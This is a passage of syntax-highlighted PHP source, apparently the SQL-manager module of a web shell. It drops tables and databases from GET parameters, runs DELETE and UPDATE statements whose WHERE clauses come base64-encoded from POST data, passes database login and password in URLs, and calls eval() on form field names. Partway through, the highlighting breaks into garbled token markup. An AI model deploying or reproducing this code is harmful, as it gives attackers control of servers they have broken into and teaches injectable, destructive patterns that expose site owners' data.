<span class="k">print</span> <span class="s2">&quot;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;delete_table=</span><span class="si">$str[0]</span><span class="s2">&#39; onclick=&#39;return confirm(</span><span class="se">\&quot;</span><span class="s2">DELETE </span><span class="si">$str[0]</span><span class="s2"> ?</span><span class="se">\&quot;</span><span class="s2">)&#39; title=&#39;Delete </span><span class="si">$str[0]</span><span class="s2">?&#39;&amp;gt;[D]&amp;lt;/a&amp;gt;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;baza=1&amp;rename_table=</span><span class="si">$str[0]</span><span class="s2">&#39; title=&#39;Rename </span><span class="si">$str[0]</span><span class="s2">&#39;&amp;gt;[R]&amp;lt;/a&amp;gt;&amp;lt;font color=red&amp;gt;[</span><span class="si">$records[0]</span><span class="s2">]&amp;lt;/font&amp;gt; &amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?vnutr=1&amp;p=sql&amp;vn=</span><span class="si">$str[0]</span><span class="s2">&amp;baza=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;tbl=</span><span class="si">$str[0]</span><span class="s2">&#39;&amp;gt;</span><span class="si">$str[0]</span><span class="s2">&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
<span class="nv">$total_t</span><span class="o">++</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;B&amp;gt;&amp;lt;font color=red&amp;gt;Total tables: </span><span class="si">$total_t</span><span class="s2">&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
                                <span class="k">print</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$s4ot</span><span class="o">+</span><span class="mi">10</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="k">print</span> <span class="s2">&quot;&amp;nbsp;&quot;</span><span class="p">;}</span>
                                <span class="k">print</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="c1">#end baza</span>




<span class="c1"># delete table</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$delete_table</span><span class="p">)){</span>
<span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;DROP TABLE IF EXISTS </span><span class="si">$delete_table</span><span class="s2">&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;Table [ </span><span class="si">$delete_table</span><span class="s2"> ] :: Deleted success!&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">5;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;baza=1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1"># end of delete table</span>

<span class="c1"># delete database</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete_db&#39;</span><span class="p">])){</span>
<span class="nb">mysql_drop_db</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete_db&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;Database &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete_db&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; :: Deleted Success!&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">5;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1"># end of delete database</span>

<span class="c1"># delete row</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;delete_row&#39;</span><span class="p">])){</span>
<span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;delete_row&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;delete_row&#39;</span><span class="p">]);</span>
<span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;DELETE FROM &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; WHERE &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;delete_row&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="nv">$del_result</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;Deleted Success!&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;delete_row&#39;</span><span class="p">];</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">5;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;vnutr=1&amp;baza=1&amp;vn=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vn&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;db=</span><span class="si">$db</span><span class="s2">&amp;tbl=</span><span class="si">$tbl\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">}</span>
<span class="s2"># end of delete row</span>


<span class="si">$vn</span><span class="s2">=</span><span class="si">$_GET[&#39;vn&#39;]</span><span class="s2">;</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">valign</span><span class="o">=</span><span class="nx">top</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">green</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Database</span><span class="o">:</span> <span class="nv">$db</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$vn</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>

<span class="s2"># edit row</span>
<span class="s2">if(isset(</span><span class="si">$_POST[&#39;edit_row&#39;]</span><span class="s2">)){</span>
<span class="si">$edit_row</span><span class="s2">=base64_decode(</span><span class="si">$_POST[&#39;edit_row&#39;]</span><span class="s2">);</span>

<span class="si">$r_edit</span><span class="s2"> = mysql_query(&quot;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nv">$tbl</span> <span class="nx">WHERE</span> <span class="nv">$edit_row</span><span class="s2">&quot;) or die(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
       <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">table</span> <span class="nx">border</span><span class="o">=</span><span class="mi">0</span> <span class="nx">cellpadding</span><span class="o">=</span><span class="mi">1</span> <span class="nx">cellspacing</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
       <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Row</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Value</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">print  &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="nx">post</span> <span class="nx">action</span><span class="o">=</span><span class="s1">&#39;$php_self?p=sql&amp;login=&quot;.$_GET[&#39;</span><span class="nx">login</span><span class="s1">&#39;].&quot;&amp;pass=&quot;.$_GET[&#39;</span><span class="nx">pass</span><span class="s1">&#39;].&quot;&amp;adress=&quot;.$_GET[&#39;</span><span class="nx">adress</span><span class="s1">&#39;].&quot;&amp;conn=1&amp;baza=1&amp;tbl=&quot;.$_GET[&#39;</span><span class="nx">tbl</span><span class="s1">&#39;].&quot;&amp;vn=&quot;.$_GET[&#39;</span><span class="nx">vn</span><span class="s1">&#39;].&quot;&amp;db=&quot;.$_GET[&#39;</span><span class="nx">db</span><span class="s1">&#39;].&quot;&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">print  &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">hidden</span> <span class="nx">name</span><span class="o">=</span><span class="nx">edit_row</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;&quot;.$_POST[&#39;</span><span class="nx">edit_row</span><span class="s1">&#39;].&quot;&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">print &quot;</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">radio</span> <span class="nx">name</span><span class="o">=</span><span class="nx">upd</span> <span class="nx">value</span><span class="o">=</span><span class="nx">update</span> <span class="nx">checked</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Update</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
        <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">radio</span> <span class="nx">name</span><span class="o">=</span><span class="nx">upd</span> <span class="nx">value</span><span class="o">=</span><span class="nx">insert</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Insert</span> <span class="k">new</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>


<span class="si">$i</span><span class="s2">=0;</span>
<span class="s2">while(</span><span class="si">$mn</span><span class="s2"> = mysql_fetch_array(</span><span class="si">$r_edit</span><span class="s2">, MYSQL_ASSOC)){</span>
<span class="s2">foreach(</span><span class="si">$mn</span><span class="s2"> as </span><span class="si">$key</span><span class="s2"> =&amp;gt;</span><span class="si">$val</span><span class="s2">){</span>
<span class="si">$type</span><span class="s2">  = mysql_field_type(</span><span class="si">$r_edit</span><span class="s2">, </span><span class="si">$i</span><span class="s2">);</span>
<span class="si">$len</span><span class="s2">  = mysql_field_len(</span><span class="si">$r_edit</span><span class="s2">, </span><span class="si">$i</span><span class="s2">);</span>
<span class="si">$del</span><span class="s2"> .= &quot;</span><span class="sb">`$key`</span><span class="o">=</span><span class="s1">&#39;&quot;.adds($val).&quot;&#39;</span> <span class="k">AND</span> <span class="s2">&quot;;</span>
<span class="si">$c</span><span class="s2">=strlen(</span><span class="si">$val</span><span class="s2">);</span>
<span class="si">$val</span><span class="s2">=htmlspecialchars(</span><span class="si">$val</span><span class="s2">, ENT_NOQUOTES);</span>
<span class="si">$str</span><span class="s2">=&quot;</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">textarea</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;$key&#39;</span> <span class="nx">cols</span><span class="o">=</span><span class="mi">39</span> <span class="nx">rows</span><span class="o">=</span><span class="mi">5</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$val</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">textarea</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;;</span>
<span class="si">$buff</span><span class="s2"> .= &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="nx">silver</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$key</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">green</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;(</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$type</span><span class="p">(</span><span class="nv">$len</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;)</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$str</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="si">$i</span><span class="s2">++;</span>
<span class="s2">}</span>

<span class="s2">}</span>
<span class="si">$delstring</span><span class="s2">=base64_encode(</span><span class="si">$del</span><span class="s2">);</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">hidden</span> <span class="nx">name</span><span class="o">=</span><span class="nx">delstring</span> <span class="nx">value</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$delstring\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">print &quot;</span><span class="nv">$buff</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">table</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">if(!</span><span class="si">$_POST[&#39;makeupdate&#39;]</span><span class="s2">){print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">submit</span> <span class="nx">value</span><span class="o">=</span><span class="nx">Update</span> <span class="nx">name</span><span class="o">=</span><span class="nx">makeupdate</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">form</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;}</span>




<span class="s2">if(</span><span class="si">$_POST[&#39;makeupdate&#39;]</span><span class="s2">){</span>
<span class="s2">if(</span><span class="si">$_POST[&#39;upd&#39;]</span><span class="s2">==&#39;update&#39;){</span>
<span class="s2">preg_match_all(&quot;</span><span class="o">/</span><span class="nx">name</span><span class="o">=</span><span class="s1">&#39;(.*?)&#39;</span><span class="nx">\scols</span><span class="o">=</span><span class="mi">39</span><span class="nx">\srows</span><span class="o">=</span><span class="mi">5</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;(</span><span class="o">.*?</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">\</span><span class="o">/</span><span class="nx">textarea</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">/</span><span class="nx">i</span><span class="s2">&quot;,</span><span class="si">$buff</span><span class="s2">,</span><span class="si">$matches3</span><span class="s2">);</span>
<span class="si">$delstring</span><span class="s2">=</span><span class="si">$_POST[&#39;delstring&#39;]</span><span class="s2">;</span>
<span class="si">$delstring</span><span class="s2">=base64_decode(</span><span class="si">$delstring</span><span class="s2">);</span>
<span class="si">$delstring</span><span class="s2"> = substr(</span><span class="si">$delstring</span><span class="s2">, 0, strlen(</span><span class="si">$delstring</span><span class="s2">)-5);</span>

<span class="s2">for(</span><span class="si">$i</span><span class="s2">=0; </span><span class="si">$i</span><span class="s2">&amp;lt;count(</span><span class="si">$matches3[0]</span><span class="s2">); </span><span class="si">$i</span><span class="s2">++){</span>
<span class="s2">eval(&quot;</span><span class="nx">\</span><span class="err">$</span><span class="s2">&quot;.</span><span class="si">$matches3[1]</span><span class="s2">[</span><span class="si">$i</span><span class="s2">].&quot;</span> <span class="o">=</span> <span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nx">adds2</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
<span class="nv">$total_str</span> <span class="o">.=</span> <span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;=&#39;&quot;</span><span class="o">.</span><span class="nx">adds2</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]])</span><span class="o">.</span><span class="s2">&quot;&#39;,&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$total_str</span> <span class="o">=</span> <span class="nb">substr_replace</span><span class="p">(</span><span class="nv">$total_str</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="nv">$up_string</span> <span class="o">=</span> <span class="s2">&quot;UPDATE `</span><span class="si">$tbl</span><span class="s2">` SET </span><span class="si">$total_str</span><span class="s2"> WHERE </span><span class="si">$delstring</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nv">$up_string</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$up_string</span><span class="p">,</span> <span class="nx">ENT_NOQUOTES</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;b&amp;gt;PHP var:&amp;lt;br&amp;gt;&amp;lt;/b&amp;gt;</span><span class="se">\$</span><span class="s2">sql=</span><span class="se">\&quot;</span><span class="si">$up_string\</span><span class="s2">&quot;</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">5;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;vnutr=1&amp;baza=1&amp;vn=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vn&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;db=</span><span class="si">$db</span><span class="s2">&amp;tbl=</span><span class="si">$tbl\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">mysql_query(</span><span class="si">$up_string</span><span class="s2">) or die(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">}#end of make update</span>



<span class="s2">if(</span><span class="si">$_POST[&#39;upd&#39;]</span><span class="s2">==&#39;insert&#39;){</span>
<span class="s2">preg_match_all(&quot;</span><span class="o">/</span><span class="nx">name</span><span class="o">=</span><span class="s1">&#39;(.*?)&#39;</span><span class="nx">\scols</span><span class="o">=</span><span class="mi">39</span><span class="nx">\srows</span><span class="o">=</span><span class="mi">5</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;(</span><span class="o">.*?</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">\</span><span class="o">/</span><span class="nx">textarea</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">/</span><span class="nx">i</span><span class="s2">&quot;,</span><span class="si">$buff</span><span class="s2">,</span><span class="si">$matches3</span><span class="s2">);</span>
<span class="si">$delstring</span><span class="s2">=</span><span class="si">$_POST[&#39;delstring&#39;]</span><span class="s2">;</span>
<span class="si">$delstring</span><span class="s2">=base64_decode(</span><span class="si">$delstring</span><span class="s2">);</span>
<span class="si">$delstring</span><span class="s2"> = substr(</span><span class="si">$delstring</span><span class="s2">, 0, strlen(</span><span class="si">$delstring</span><span class="s2">)-5);</span>

<span class="s2">for(</span><span class="si">$i</span><span class="s2">=0; </span><span class="si">$i</span><span class="s2">&amp;lt;count(</span><span class="si">$matches3[0]</span><span class="s2">); </span><span class="si">$i</span><span class="s2">++){</span>
